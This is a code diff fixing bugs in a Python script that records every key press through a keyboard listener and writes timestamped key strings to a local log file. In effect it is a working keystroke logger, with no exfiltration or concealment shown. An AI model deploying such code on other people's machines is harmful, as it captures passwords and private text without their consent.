@@ -14,7 +14,7 @@ collected_events = []
 scheduled_timer = None
 
 def save_press(key):
-    global scheduled_timer
+    global scheduled_timer, collected_events
     collected_events += [key]
     if scheduled_timer and not scheduled_timer.finished.is_set():
         scheduled_timer.cancel()
@@ -23,18 +23,19 @@ def save_press(key):
 
 def _full_key_save():
     global collected_events
-    keys = ''
-    for i in collected_events:
-        keys += i
-    line = '{0},{1}\n'.format(time.time(), keys)
+    print(collected_events)
+    keys = ' '.join([str(i) for i in collected_events])
+    line = '{0},\'{1}\'\n'.format(time.time(), keys)
+    print(line)
     log_file.write(line)
+    collected_events = []
 
 def on_press(key):
     try:
         if DEBUG:
             print('alphanumeric key {0} pressed'.format(
                 key.char))
-        save_press(line, key.char)
+        save_press(key.char)
     except AttributeError:
         if DEBUG:
             print('special key {0} pressed'.format(
@@ -60,5 +61,5 @@ with keyboard.Listener(
 listener = keyboard.Listener(
     on_press=on_press,
     on_release=on_release)
-listener.start()
 print('Running...')
+listener.start()
